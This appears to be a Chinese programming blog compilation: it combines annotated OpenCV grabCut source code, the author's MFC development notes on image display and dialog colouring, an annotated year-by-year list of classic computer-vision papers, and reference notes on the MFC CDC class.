                toSink = -log( fgdGMM(color) );
            }
            else if( mask.at<uchar>(p) == GC_BGD )
            {
                //对于确定为背景的像素点，它与Source点（前景）的连接为0，与Sink点的连接为lambda
				fromSource = 0;
                toSink = lambda;
            }
            else // GC_FGD
            {
                fromSource = lambda;
                toSink = 0;
            }
			//设置该顶点vtxIdx分别与Source点和Sink点的连接权值
            graph.addTermWeights( vtxIdx, fromSource, toSink );

            // set n-weights  n-links
            //计算两个邻域顶点之间连接的权值。
			//也即计算Gibbs能量的第二个能量项（平滑项）
			if( p.x>0 )
            {
                double w = leftW.at<double>(p);
                graph.addEdges( vtxIdx, vtxIdx-1, w, w );
            }
            if( p.x>0 && p.y>0 )
            {
                double w = upleftW.at<double>(p);
                graph.addEdges( vtxIdx, vtxIdx-img.cols-1, w, w );
            }
            if( p.y>0 )
            {
                double w = upW.at<double>(p);
                graph.addEdges( vtxIdx, vtxIdx-img.cols, w, w );
            }
            if( p.x<img.cols-1 && p.y>0 )
            {
                double w = uprightW.at<double>(p);
                graph.addEdges( vtxIdx, vtxIdx-img.cols+1, w, w );
            }
        }
    }
}

//论文中：迭代最小化算法step 3：分割估计：最小割或者最大流算法
/*
  Estimate segmentation using MaxFlow algorithm
*/
static void estimateSegmentation( GCGraph<double>& graph, Mat& mask )
{
    //通过最大流算法确定图的最小割，也即完成图像的分割
	graph.maxFlow();
    Point p;
    for( p.y = 0; p.y < mask.rows; p.y++ )
    {
        for( p.x = 0; p.x < mask.cols; p.x++ )
        {
            //通过图分割的结果来更新mask，即最后的图像分割结果。注意的是，永远都
			//不会更新用户指定为背景或者前景的像素
			if( mask.at<uchar>(p) == GC_PR_BGD || mask.at<uchar>(p) == GC_PR_FGD )
            {
                if( graph.inSourceSegment( p.y*mask.cols+p.x /*vertex index*/ ) )
                    mask.at<uchar>(p) = GC_PR_FGD;
                else
                    mask.at<uchar>(p) = GC_PR_BGD;
            }
        }
    }
}

//最后的成果：提供给外界使用的伟大的API：grabCut 
/*
****参数说明：
	img——待分割的源图像，必须是8位3通道（CV_8UC3）图像，在处理的过程中不会被修改；
	mask——掩码图像，如果使用掩码进行初始化，那么mask保存初始化掩码信息；在执行分割
		的时候，也可以将用户交互所设定的前景与背景保存到mask中，然后再传入grabCut函
		数；在处理结束之后，mask中会保存结果。mask只能取以下四种值：
		GCD_BGD（=0），背景；
		GCD_FGD（=1），前景；
		GCD_PR_BGD（=2），可能的背景；
		GCD_PR_FGD（=3），可能的前景。
		如果没有手工标记GCD_BGD或者GCD_FGD，那么结果只会有GCD_PR_BGD或GCD_PR_FGD；
	rect——用于限定需要进行分割的图像范围，只有该矩形窗口内的图像部分才被处理；
	bgdModel——背景模型，如果为null，函数内部会自动创建一个bgdModel；bgdModel必须是
		单通道浮点型（CV_32FC1）图像，且行数只能为1，列数只能为13x5；
	fgdModel——前景模型，如果为null，函数内部会自动创建一个fgdModel；fgdModel必须是
		单通道浮点型（CV_32FC1）图像，且行数只能为1，列数只能为13x5；
	iterCount——迭代次数，必须大于0；
	mode——用于指示grabCut函数进行什么操作，可选的值有：
		GC_INIT_WITH_RECT（=0），用矩形窗初始化GrabCut；
		GC_INIT_WITH_MASK（=1），用掩码图像初始化GrabCut；
		GC_EVAL（=2），执行分割。
*/
void cv::grabCut( InputArray _img, InputOutputArray _mask, Rect rect,
                  InputOutputArray _bgdModel, InputOutputArray _fgdModel,
                  int iterCount, int mode )
{
    Mat img = _img.getMat();
    Mat& mask = _mask.getMatRef();
    Mat& bgdModel = _bgdModel.getMatRef();
    Mat& fgdModel = _fgdModel.getMatRef();

    if( img.empty() )
        CV_Error( CV_StsBadArg, "image is empty" );
    if( img.type() != CV_8UC3 )
        CV_Error( CV_StsBadArg, "image mush have CV_8UC3 type" );

    GMM bgdGMM( bgdModel ), fgdGMM( fgdModel );
    Mat compIdxs( img.size(), CV_32SC1 );

    if( mode == GC_INIT_WITH_RECT || mode == GC_INIT_WITH_MASK )
    {
        if( mode == GC_INIT_WITH_RECT )
            initMaskWithRect( mask, img.size(), rect );
        else // flag == GC_INIT_WITH_MASK
            checkMask( img, mask );
        initGMMs( img, mask, bgdGMM, fgdGMM );
    }

    if( iterCount <= 0)
        return;

    if( mode == GC_EVAL )
        checkMask( img, mask );

    const double gamma = 50;
    const double lambda = 9*gamma;
    const double beta = calcBeta( img );

    Mat leftW, upleftW, upW, uprightW;
    calcNWeights( img, leftW, upleftW, upW, uprightW, beta, gamma );

    for( int i = 0; i < iterCount; i++ )
    {
        GCGraph<double> graph;
        assignGMMsComponents( img, mask, bgdGMM, fgdGMM, compIdxs );
        learnGMMs( img, mask, compIdxs, bgdGMM, fgdGMM );
        constructGCGraph(img, mask, bgdGMM, fgdGMM, lambda, leftW, upleftW, upW, uprightW, graph );
        estimateSegmentation( graph, mask );
    }
}


 
 
 





2014.5.29 问题1：如何封装一个图像处理库？ 可以参照学习OpenCV2，第三章的内容来进行处理 问题2：封装好了之后，如何关联显示？做到跨平台？ 处理完后返回一块内存，根据不同的格式进行打包。 2014.5.30 问题1：实现鼠标标记图像前景与背景的业务逻辑如何实现？ 这里提供一个类：用来实现图像在windows下与设备上下文的绘制工作 #pragma once class CImageHolder { public: CImageHolder(void); ~CImageHolder(void); int initialize(int Width, int Height); public: inline CDC* GetDC(void) {return &m_DC;} inline void fillSolid(COLORREF clr)  {m_DC.FillSolidRect(0,0,m_Width,m_Height,clr);} inline void drawDC(CDC* pDC, int x, int y, DWORD dwRop = SRCCOPY) { pDC->BitBlt(x,y,m_Width,m_Height,&m_DC,0,0,dwRop); } inline void strechDC(CDC* pDC, int x, int y, int scale, DWORD dwRop = SRCCOPY) { pDC->StretchBlt(x,y,m_Width*scale,m_Height*scale,&m_DC,0,0,m_Width, m_Height, dwRop); } void setPixel(int x, int y, int size, COLORREF color); private: CDC m_DC; CBitmap m_Bitmap; int m_Width; int m_Height; }; int CImageHolder::initialize(int Width, int Height) { CDC dc; dc.m_hDC = ::GetDC(NULL); m_DC.CreateCompatibleDC(&dc); m_Bitmap.CreateCompatibleBitmap(&dc, Width, Height); m_DC.SelectObject(&m_Bitmap); fillSolid(RGB(0,0,0)); m_Width = Width; m_Height = Height; return 0; } CImageHolder::CImageHolder(void) { } CImageHolder::~CImageHolder(void) { } void CImageHolder::setPixel(int x, int y, int size, COLORREF color)  { int i,j; for (i=x-size;i<=x+size;i++) for (j=y-size;j<=y+size;j++) m_DC.SetPixel(i,j,color); } MFC —— CWnd::SetCapture  调用此函数后，接下来所有的鼠标事件都被发送到当前的CWnd对象，发送给CWnd对象的事件中不包括鼠标的坐标信息。   函数原型：    CWnd* SetCapture( );    返回值：    返回一个指针，该指针指向之前接受所有鼠标输入的窗口对象。如果返回值为空，则说明这样的窗口不存在。这个返回值可能是临时的，所以不能将它存储下来在后面使用。    关键点：    当CWnd的对象不再要求所有的鼠标输入时，应用程序应该调用ReleaseCapture函数，从而让别的窗口可以接受鼠标输入。 WM_CTLCOLOR和OnCtlColor消息的用法 很多人都觉得自己的程序的界面不那么美观，往往VC默认产生的对话框比较单调，因此很多人往往找到很多其它的控件对对话框进行美化修饰，例如给静态控件设置字体，设置背景颜色等等，其实这些完全可以由VC自己的WM_CTLCOLOR消息来完成！ WM_CTLCOLOR消息用来完成对EDIT、STATIC、BUTTON等控件设置背景和字体颜色，其用法如下： 1.首先在自己需要设置界面的对话框上点击右键-->建立类向导-->加入WM_CTLCOLOR消息-->自动生成OnCtlColor（）函数，此函数可以对本对话框的控件的界面外观做修饰，用法如下：   将类向导产生的函数做如下修改： HBRUSH CDialogColor::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)    {    HBRUSH hbr = CDialog::OnCtlColor(pDC,pWnd, nCtlColor);    // TODO: Change any attributes of theDC here    //设置显示字体    CFont * cFont=new CFont;    cFont->CreateFont(16,0,0,0,FW_SEMIBOLD,FALSE,FALSE,0,     ANSI_CHARSET,OUT_DEFAULT_PRECIS,    CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,    DEFAULT_PITCH&FF_SWISS,"Arial");    //对特定的控件做修改    switch(nCtlColor)    {    case CTLCOLOR_STATIC: //对所有静态文本控件的设置    {    pDC->SetBkMode(TRANSPARENT);     //设置背景为透明    pDC->SetTextColor(RGB(255,255,0)); //设置字体颜色    pWnd->SetFont(cFont); //设置字体    HBRUSH B = CreateSolidBrush(RGB(125,125,255));     //创建画刷    return (HBRUSH) B; //返回画刷句柄    }    case CTLCOLOR_EDIT: //对所有编辑框的设置    {    pDC->SetBkMode(TRANSPARENT);     pDC->SetTextColor(RGB(255,255,0));     pWnd->SetFont(cFont);     HBRUSH B = CreateSolidBrush(RGB(125,125,255));     return (HBRUSH) B;     }    default:    return CDialog::OnCtlColor(pDC,pWnd, nCtlColor);    }    } 注：case的类别有以下几种：   CTLCOLOR_BTN 按钮控件    CTLCOLOR_DLG 对话框    CTLCOLOR_EDIT 编辑框    CTLCOLOR_LISTBOX 列表框    CTLCOLOR_MSGBOX 消息框    CTLCOLOR_SCROLLBAR 滚动条    CTLCOLOR_STATIC 静态文本    2.你可能觉得对所有的控件使用统一的界面设置觉得不自由，其实VC同样可以对特定的ID的控件进行设置，方法如下： switch (pWnd->GetDlgCtrlID())    {     //针对ID为IDC_CTL1、IDC_CTL2和IDC_CTL3的控件进行同样的设置    case IDC_CTL1:    case IDC_CTL2:    case IDC_CTL3:     {    pDC->SetBkMode(TRANSPARENT);    pDC->SetTextColor(RGB(255,255, 0));    pWnd->SetFont(cFont);    HBRUSH B = CreateSolidBrush(RGB(125,125,255));    return (HBRUSH) B;    }    default:    return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);    } 通过消息WM_CTLCOLOR我们可以改变对话框或一些特殊控件的背景颜色   1、添加WM_CTLCOLOR消息映射。    2、在CWnd::OnCtlColor里面作相应的处理    HRESULT CWnd::OnCtlColor(CDC *pDC, CWnd *pWnd, UINT nCtlColor)    {    switch (nCtlColor)    {    case CTLCOLOR_BTN: // Button control     {    pDC->SetBkColor( RGB( 255, 0, 0) );    }    break;    case CTLCOLOR_DLG: // Dialog box     break;    case CTLCOLOR_EDIT: // Edit control     {    COLORREF bkColor = RGB(255,0,0);    CRect rect;    pWnd->GetClientRect(&rect);     CBrush br;    br.CreateSolidBrush(bkColor);    pDC->FillRect(rect, &br);*/    pDC->SetBkColor(bkColor);    }    break;    case CTLCOLOR_LISTBOX: // List-box control     break;    case CTLCOLOR_MSGBOX: // Message box    break;    case CTLCOLOR_SCROLLBAR: // Scroll-bar control     break;    case CTLCOLOR_STATIC: // Static control    break;    default:    break;    }    return CWnd::OnCtlColor(pDC, pWnd, nCtlColor);    } 2014.6.1 问题：实现图片缩放，还是窗口缩放？ 原作者代码中实际上实现的是窗口缩放 





图像处理和计算机视觉中的经典论文



　 感谢水木上同领域的同学分享，有了他的整理，让我很方便的获得了CV方面相关的经典论文，我也顺便整理一下，把pdf中的文字贴到网页上，方便其它人更直观的获取所要内容~~~
     资料的下载链接为：      
http://iask.sina.com.cn/u/2252291285/ish?folderid=775855
    以下为该同学的整理的综述：
“
前言：最近由于工作的关系，接触到了很多篇以前都没有听说过的经典文章，在感叹这些文章伟大的同时，也顿感自己视野的狭小。  想在网上找找计算机视觉界的经典文章汇总，一直没有找到。失望之余，我决定自己总结一篇，希望对 CV 领域的童鞋们有所帮助。由于自己的视野比较狭窄，肯定也有很多疏漏，权当抛砖引玉了，如果你觉得哪篇文章是非常经典的，也可以把相关信息连带你的昵称发给我，我好补上。我的信箱 xdyang.ustc@gmail.com

文章主要来源：PAMI, IJCV, TIP, CVIU, PR, IVC, CVGIU, CVPR, ICCV, ECCV, NIPS, SIGGRAPH, BMVC等
主要参考网站: Google scholar, citeseer, cvpapers, opencv 中英文官方网站 
主要参考书籍： 
数字图像处理  第三版  冈萨雷斯等 
图像处理，分析和机器视觉  第三版  Sonka等（非常非常好的一本书） 
学习OpenCV 
计算机视觉：算法与应用 

文章按时间排序，排名不分先后，^_^。每一行最后一栏是我自己加的注释，如果不喜欢可以无视之，如果有不对的地方还请告诉我，免得继续出丑。 给出的文章有些是从google scholar或者citeseer上拷贝下来的，所以有链接。所有的文章在网上都很容易找到。有空的时候我会把它们全部整理出来，逐步上传到ishare.iask.sina.com
由于整理的很仓促，时间也很短，还有很多不完善的地方。我会不断改进，并不时上传新版本。 
上传地址为http://iask.sina.com.cn/u/2252291285/ish?folderid=775855
最后更新：2012/3/14
1990 年之前 
Peter Burt, Edward Adelson
The  Laplacian  Pyramid  as  ACompact Image Code
虽说这个Laplacian Pyramid是有冗余的，但使用起来非常简单方便，对理解小波变换也非常有帮助。这位Adelson是W.T.Freeman的老板，都是大牛.
J Canny
A Computational Approach to EdgeDetection
经典不需要解释。在 Sonka的书里面对这个算法也有比较详细的描述。
S Mallat.
A  theory  for  multiresolution  signaldecomposition:  The 
 waveletrepresentation
Mallat的代表作
M Kass, A Witkin, D  Terzopoulos.
Snakes: active contour models
Deformable model的开山鼻祖。
RM HARALICK
Textural Features for Image Classiﬁcation
这三篇都是关于纹理特征的，虽然过去这么多年了，现在在检索和识别中依然很有用。
RM HARALICK
Statistical and structural approaches
 
Tamura等
Texture features corresponding to visual perception
 
A P Dempster, N M Laird, D B Rubin. 1977
Maximum  likelihood  from  incomplete data via the EM algorithm 
EM 算法在计算机视觉中有着非常重要的作用
L Rabiner. 1989
A Tutorial on Hidden Markov Models and Selected Applications in Speech Recognition
HMM 同样是计算机视觉必须掌握的一项工具
B D Lucas, T Kanade
An  iterative  image  registration technique  with  an  application  to stereo- vision
Lucas 光流法
J R Quinlan
Induction of decision trees
偏模式识别和机器学习一点
1990 年 
P Perona, J Malik. PAMI
Scale-space and edge detection using anisotropic diffusion
关于 scale space 最早的一篇论文之一，引用率很高                                                                      
T Lindeberg
Scale-space for discrete signals.
Lindeberg 关于 scale space 比较早的一篇，后续还有好几篇
anzad, A.; Hong, Y.H.
Invariant image recognition by Zernike moments
Zernike moment,做过模式识别或者检索的应该都知道这个东东
1991 年 
W Freeman, E Adelson.
The design and use of steerable filters
Freeman最早的一篇力作，也是我读的第一篇学术论文。现在Freeman在 MIT 风生水起，早已是IEEE Fellow了     
Michael J. Swain , Dana H. Ballard
Color Indexing.
google scholar 上引用将近五千次
MA Turk CVPR
Face recognition using eigenfaces
 
1992 年 
L G Brown.
A survey of image registration techniques.
比较早的一篇关于配准的综述了                                                                                                                                                 
1993 年
S G Mallat, Z Zhang.
Matching pursuits with time-frequency dictionaries
Mallat另一篇关于小波的文章，不研究小波的可以无视之               
L Vincent.
Morphological grayscale reconstruction in image analysis: Applications and efficient algorithms
 
DP Huttenlocher
Comparing images using the Hausdorff distance
Google scolar 上引用2200多次
1994 年
J Shi, C Tomasi.
Good feature to track.
Tomasi这个名字还会出现好几次，真的很牛                                                                                      
Linderberg
Scale-space theory in computer vision
 
J L Barron, D J Fleet, S S  Beauchemin.
Performance  of  optical  flow techniques.
 
1995 年 
R Malladi, J Sethian, B Vemuri.
Shape Modeling with Front Propagation: A Level Set Approach
Level set的经典文章                                                                                              
TF COOTES
Active Shape Models-Their Training and Application
ASM
MA Stricker
Similarity of color images
颜色检索相关
C Cortes, V Vapnik.
Support-vector networks.
SVM 在计算机视觉中也有着非常重要的地位
1996 年 
T MCINERNEY.
Deformable models in medical image analysis: A survey
活动模型的一篇较早的综述
Tai Sing Lee
Image Representation Using 2D Gabor Wavelets
Google引用也有近千次
Amir Said,  A. Pearlman
A New, Fast, and Efﬁcient  Image Codec Based on Set Partitioning in Hierarchical Tree
SPIHT。图像压缩领域与 EBCOT齐名的经典算法。
L P Kaelbling, M L Littman, A W Moore.
Reinforcement learning: A survey
机器学习里面的一篇综述，引用率比较高，就列在这了。
B. S. Manjunath and W. Y. Ma
Texture features for browsing and retrieval of image data
检索的文章比较多，其实它们的应用不仅仅是检索。只要是需要提取特征的地方，检索里面的方法都可以用到
 
comparing images using color coherence vectors
检索中的CCV方法
 
Image retrieval using color and shape
关于形状特征后面有一篇综述
1997 年
V Caselles, R Kimmel, G Sapiro.
Geodesic active contours
活动轮廓模型的一个小分支
R E Schapire, Y Freund, P Bartlett, W S Lee.
Boosting the Margin: A New Explanation for the Effectiveness of Voting Methods.
Schapire 和 Freund 发 明 了Adaboost，给计算机视觉带来了不少经典算法
F Maes, D Vandermeulen, G Marchal, P Suetens.
Multimodality  image registration by maximization of mutual information
互信息量配准
E Osuna, R Freund, F Girosi.
Training support vector machines: An application to face detection.
SVM在人脸检测中的应用。不过人脸检测最经典的方法应 该是Viola-Jones
J Huang, S Kumar, M Mitra, W-J Zhu, R Zabih.
Image indexing using color correlogram
Color correlogram，检索中的又一个颜色特征。和前面的 CCV 以及颜色矩特征基本上覆盖了所有的颜色特征。
Y Freund, R Schapire.
A  decisiontheoretic  generalization  of on-line learning and an application to boosting. 
Adaboost的经典文章
1998 年 
1998 年是图像处理和计算机视觉经典文章井喷的一年。大概从这一年开始，开始有了新的趋势。由于竞争的加剧，一些好的算法都先发在会议上了，先占个坑，等过一两年之后再扩展到会议上。
T Lindeberg
Feature detection with automatic scale selection
Linderberg的 scale space到此为止基本结束了。在一些边缘提取，道路或者血管检测中，scale space 确实是一种很不错的工具
C J C Burges.
A tutorial on support vector machines for pattern recognition.
使用 svm的话，这篇文章应该是必读的了。比 95 年那篇原始文章引用率还高
M Isard, A Blake.
CONDENSATION  –  Conditional TrackingDensity Propagation for Visual
Tracking中的经典文章了
L Page, S Brin, R Motwani, T  Winograd
The PageRank citation ranking: bringing order to the web
这篇文章应该不属于 CV 的范畴，鉴于作者的大名鼎鼎，暂且列在这
C Tomasi, R Manduchi.
Bilateral filtering for gray and color images.
做过图像滤波平滑去噪或者 HDR的应该都知道Bilateral filter。原理非常非常简单，简单到一个公式就可以概括这篇文章，简单到实在无法扩充到期刊。这也是 Tomasi 第二次出现了。一直很纳闷，这个很直观的思想在这之前怎么就从来没人提呢。
C  Xu, J L Prince.
Snakes, shapes and gradient vector flow.
终于碰到中国人写的文章了，很荣幸还是校友。GVF是 snake和levelset领域的重要分支和方法
Wim Sweldens.
The lifting scheme: A construction of second generation wavelets.
第二代小波。真正让小波有了实用价值，在 JPEG2000 中就采用的提升小波。个人更喜欢的是下一篇，简单易懂，字体也大
Daubechies Wim Sweldens
Factoring wavelet transforms into lifting steps
另一位作者也很牛，小波十讲的作者
H A Rowley, S Baluja, T Kanade.
Neural Network-based Face Detection.
做人脸的应该是必看的了。不做人脸的话应该可以不用看吧
J B A Maintz, M A Viergever.
A survey of medical image registration.
关于图像配准的另一篇综述
T F Cootes, G J Edwards, C J Taylor.
Active Appearance Models
AAM
1999 年 
D Lowe.
Object Recognition from Local Scale-invariant Features
大名鼎鼎的SIFT，后面有一篇IJCV上的 Journal版本，更全面一点。             
R E Schapire.
A brief Introduction to Boosting
还是 boosting
D M Gavrila.
The visual analysis of human movements: a survey
综述文章的引用一般都比较高
Y Rui, T S Huang, S F Change.
Image retrieval: current techniques, promising directions, and open issues
TSHuang小组对检索的一个总结
J K Aggarwal, Q Cai.
Human motion analysis: a review
人体运动分析的一个综述
2000 年 
世纪之交，各种综述都出来了
J Shi, J Malik.
Normalized Cuts and Image Segmentation
NCuts的引用率相当高，Jianbo Shi也因为这篇文章成为计算机视觉界引用率最高的作者之一
Z Zhang.
A Flexible New Technique for Camera Calibration
张正友的关于摄像机标定的经典短文
A K Jain, R P W Duin, J C Mao.
Statistical pattern  recognition: a review.
统计模式识别综述，这一年 pami上两篇很有名的综述之一。 在这里推荐 Web 写的 Statistical Pattern Recognition第三版，相当不错，网上有电子版。
C Stauffe
Learning Patterns of Activity Using Real-Time Tracking
搜 TLD 的时候发现这篇文章引用率也很高，两千多次。还没来得及读。
D Taubman.
High performance Scalable Image Compression With EBCOT
EBCOT，JPEG2000 中的算法
A W M Smeulders, M Worring, S Santini, A Gupta, R Jain.
Content-based image retrieval at the end of the early years
在世纪之交对图像检索的一篇很权威的综述。感觉在这之后检索的研究也没那么热了。不过在工业界热度依旧，各大网上购物平台，比如淘宝，  亚马逊，京东等都在做这方面的研发，衣服检索是一个很不错的应用点。
M Pantic, L J M Rothkrantz.
Automatic analysis of facial expressions: the state of the art.
 
N Paragios, R Deriche.
Geodesic active contours and  level sets for the detection and tracking of moving objects
使用 level set做跟踪
Y Rubner, C Tomasi, L Guibas.
TThe earth mover’s distance as a metric for image retrieval.
EMD算法。Tomasi再次出现
 
PicToSeek Combining Color and Shape Invariant Features for Image Retrieval
依然是检索特征
2001 年 
Paul Viola, Michael J Jones.
Robust real-time object detection
这是一篇很牛的文章，在人脸检测上几乎成了标准。比较坑爹的是，号称发在IJCV2001 上，但怎么找也找不到。应该是 IJCV2004年的那篇“Robust real-time face detection”吧。 他们在这一年另一篇比较出名的文章是在CVPR上的“Rapid ObjectDetection using a Boosted Cascade of Simple Features”这篇才是04年那篇著名文章的会议版。
Y Boykov, Kolmogorov.
An experimental comparison of min-cut/max-flow algorithms for energy minimization in vision.
俄罗斯人在 graph cut 领域开始发力了
T Moeslund, E Granum.
A Survey of Computer Vision Based Human Motion Capture
人体运动综述
T F Chan, L Vese.
Active contours without edges.
Snake 和 level set领域的经典文章
A M Martinez, A C Kak.
PCA versus LDA
PCA 也是计算机视觉中非掌握不可的工具。LDA在模式识别中有很重要的地位
BS Manjunath
Color and texture descriptors
颜色和纹理的描述子，在识别中很有用
2002 年 
D Comaniciu, P Meer.
Mean  shift:  A  robust  approach toward feature space analysis. 
Mean shift的经典文章。前两天发现 Comaniciu 已经是 IEEE Fellow了
Ming-Husan Yang, David J Kriegman, Narendra Ahuja.
Detecting  Faces  in  Images:  A Survey.
人脸检测综述，引用率想不高都难
R Hsu, M Abdel-Mottaleb.
Face Detection in Color Images.
依然是人脸检测，名字都起得这么霸气
J-L Starck, E J Candès, D L Donoho.
The  curvelet  transform  for  image denoising.
Geometrical wavelet 中的一篇代表 作 。 其 他 的 如 ridgelet, contourlet, bandelet 等在这里就不赘述了。研究这方面的很容易找到这方面的经典文献。个人以为不研究这方面的看了后对自己的研究也不会有多大启发。曾经以为这个方向会很火，到最后还是没火起来。  我觉得原因可能是现在存储和传输能力的大大提高，使得对压缩的需求没有那么大了，这方面的研究自然就停滞了，就如同JPEG2000没有成气候
 
Shape matching and object recognition using shape contexts
Shape context。用形状匹配达到目标识别目的。这方面最经典的文章了。随后后续也有一些这方面的文章，但基本都是很小的改进或者应用。作者提供了原码，可以在 matlab上运行看看效果。
N Paragios, R Deriche.
Geodesic  active  regions  and  level set methods  for  supervised  texture segmentation
 
 
Statistical Color Models with Application to Skin Detection
 
 
A tutorial on particle filters for online nonlinear non-Gaussian Bayesian tracking
particle filter 的一个综述
2003 年 
W Zhao, R Chellappa, P J Phillips, A Rosenfeld.
Face recognition: A literature survey.
人脸检测的综述
J Sivic, A Zisserman.
Video  Google:  A  text  retrieval approach  to  object  matching  in videos.
好像是Visual words的起源文章。引用率很高，先列出来再看。
D Comaniciu, V Ramesch, P Meer.
Kernel-Based Object Tracking.
基于核的跟踪。
B Zitová, J Flusser.
Image  registration  methods:  A survey.
又一篇图像配准的综述。做图像配准的比较有福气，综述很多
K Mikolajczyk, C Schmid.
A  performance  evaluation  of  local descriptors. 
比较各种描述子的，包括SIFT
M J Wainwright, M I Jordan.
Graphical  models,  exponential families, and variational inference. 
乔丹的名气太大，不露露脸说不过去
J Portilla, V Strela, M Wainwright, E Simoncelli.
Image  denoising  using  scale mixtures of gaussians  in  the wavelet domain.
图像去噪，小波变换，混合高斯
Robert E. Schapire
The Boosting Approach to Machine Learning  An Overview
boosting作者自己写的综述，自然值得一看。
2004 年 
 
Lucas-Kanade 20 Years On A Unifying Framework 
引用文章摘要的第一句话Since the Lucas-Kanade algorithm was proposed in 1981 image alignment has become one of the most widely used techniques in computer vision. Applications range from optical flow and tracking to layered motion,  mosaic construction, and face coding. 
D G Lowe.
Distinctive  image  features  from scale-invariant keypoints. 
SIFT，不解释
Chih-ChungChang,Chih-Jen Lin.  
LIBSVM: A  library  for support vectormachines
我实在怀疑引用这篇文章的人是否都看过这篇文章。貌似不看这篇文章也可以使用 LIBSVM
Z Wang, A C Bovik, H R Sheikh, E P Simoncelli.
Image  quality  assessment:  From error visibility to structural similarity
图像质量评价，最近 Bovik 还有一篇类似的文章也刊登在 TIP上
Y Ke, R Sukthankar.
Pca-sift:  a  more  distinctive representation  for  local  image descriptors
SIFT 的变形
 
Review of shape representation and description techniques
 
 
Efficient Graph-Based Image Segmentation
 
2005 年
N Dalal, B Triggs.
Histograms  of  oriented  gradients  for human detection. 
HOG  虽然很新，但很经典
A C Berg, T L Berg, J Malik.
Shape  matching  and  object recognition  using  low  distortion correspondences.
还是 shape matching
S Roth, M Black.
Fields  of  experts:  A  framework  for learning image priors.
这篇应该要归结到图像统计特性的范畴吧
Z Tu, X Chen,A L Yuille, S C Zhu.
Image  parsing:  Unifying segmentation,  detection,  and recognition.
 
 
Geodesic active regions and level set methods for motion  estimation and tracking
 
Chunming Li, Chenyang Xu, Changfeng Gui, and  Martin D. Fox
Level Set Evolution Without Re-initialization: A New Variational Formulation
这篇文章解决了level set中需要不停的重初始化的问题。在 2010 年的 TIP上有一篇 Journal版本 Distance Regularized Level Set Evolution and its Application to Image Segmentation
 
A Performance Evaluation of Local Descriptors
前面那篇是会议的，这篇是 PAMI上的。比较各种描述子的，包括SIFT
2006 年 
D Donoho.
Compressed sensing. 
CS  压缩感知  最近很火的一个名词                     
Greg Welch, Gary Bishop.
An introduction to the Kalman Filter.
kalman滤波
S Lazebnik, C Schmid, J Ponce.
Beyond  bags  of  features:  spatial pyramid  matching  for  recognizing natural scene categories. 
Visual words
Xiaojin Zhu.
Semi-supervised  learning  literature survey.
 
A Yilmaz, O Javed, M Shah.
Object Tracking: A survey.
tracking的一篇综述
 
Image Alignment and Stitching: A Tutorial
 
2007 年 
 
A Review of Statistical Approaches to Level Set Segmentation: Integrating Color, Texture, Motion and Shape             
 
 
The Appearance of Human Skin: A Survey
 
 
Local Invariant Feature Detectors: A Survey
 
2008 年 
H Bay, A Ess, T Tuytelaars, L V Gool.
SURF:  Speeded  Up  Robust Features.  
 
K E A van de Sande, T Gevers, C G M Snoek.
Evaluation  of  Color  Descriptors  for Object and Scene Recognition
 
M Yang 
A Survey of Shape Feature Extraction Techniques
虽然这篇文章的引用率目前来看并不高,但个人认为这是一篇在shape feature方面很不错的文章
P.Felzenszwalb, D. McAllester, D. Ramanan
A Discriminatively Trained, Multiscale, Deformable Part Model
2008 年的 CVPR，到现在引用已有四百多次，潜力巨大。rosepink提供
2009 年 
J Wright, A Y Yang, A Ganesh, S S Sastry, Ma.
Robust Face Recognition via Sparse Representation.                              
 
B Settles.
Active learning literature survey
 
2010 年 
 
 
 
 
 
 
2011 年 
 
Hough Forests for Object Detection, Tracking, and Action Recognition
 
 
Robust Principal Component Analysis?
Candes  和 UIUC 的Ma Yi等人                                                                         
2012 年 
Zdenek Kalal, Krystian Mikolajczyk,and Jiri Matas,
Tracking-Learning-Detection
PAMI上的，虽然还没有正式发表，但肯定会火。在作者的主页上有几篇相关的会议文章， demo和code。用到了 Lucas-Kanade方法
 
 
 

（完）“









CDC：Windows使用与设备无关的图形设备环境(DC :Device Context) 进行显示 。
MFC基础类库定义了设备环境对象类----CDC类。  CDC与CGdiObject的关系  说道CDC类就不能不提一下GdiObject---图形对象类。 在Windows应用程序中，设备环境与图形对象共同工作，协同完成绘图显示工作。就像画家绘画一样，设备环境好比是画家的画布，图形对象好比是画家的画笔。用画笔在画布上绘画，不同的画笔将画出不同的画来。选择合适的图形对象和绘图对象，才能按照要求完成绘图任务。  有关CDC类的继承
  父类：从 CObject 直接继承而来。继承了CObject类的各种特性，如动态创建等等。  子类：CClientDC-------代表操作窗口的DC ，是比较常用的一个子类  CMetaFileDC ------响应Meta File的DC ，Meta File是一些GDI消息。  CPaintDC-------响应WM_PAINT消息的DC。  CWindowDC ------代表整个屏幕的DC
  CDC类的数据成员  数据成员只有两个：  HDC m_hDC : CDC对象使用的输出设备上下文  HDC m_hAttribDC : CDC对象使用的属性设备上下文  二者在CDC对象创建时指向相同的设备上下文。

 CDC类：定义设备环境对象类 
CDC::BitBlt 从源设备环境拷贝一个位图到当前设备环境中
BOOL BitBlt(int x,int y,int nWidth,int nHeight,CDC* pSrcDC,int xSrc,int ySrc,DWORD dwRop);参数：x，y为目的矩形的左上角坐标；nWidth，nHeight为目的矩形的宽度和高度；pSrcDC是指向源设备环境的指针；xSrc，ySrc源位图左上角的坐标；dwRop为光栅操作码。CDC::CreateCompatibleDC 创建一个与pDC指定的设备相兼容的内存设备环境
virtual BOOL CreateCompatibleDC(CDC* pDC);参数：pDC 设备环境指针返回值：若成功，返回非0；否则返回0CDC::Detach 将设备环境从CDC对象中分离开来
HDC Detach()返回值：分离的设备环境
CDC::DrawEdge 绘制矩形边框或边框的一部分
BOOL DrawEdge(LPRECT lpRect,UINT nEdge,UINT nFlags);参数lpRect指向矩形的RECT结构的指针；nEdge指定矩形内外边界的风格，必须是一个内边界标志和外边界标志的组合，取值为：BDR_RAISEDINNER：内边界凸出；BDR_SUNKENINNER：内边界凹下；BDR_RAISEDOUTER：外边界凸出；BDR_SUNKENOUTER：外边界凹下；nFlags指定边界的类型，取值为：BF_RECT：矩形的所有四边；BF_LEFT：矩形的左边；BF_BOTTOM：矩形的底边；BF_RIGHT：矩形的右边；BF_TOP：矩形的上边；BF_TOPLEFT：矩形的上边和左边；BF_TOPRIGHT：矩形的上边和右边；BF_BOTTOMLEFT：矩形的下边和左边；BF_BOTTOMRIGHT：矩形的下边和右边。返回值：若成功，返回非0；否则返回0。CDC::DrawFocusRect 画一个说明输入焦点的矩形
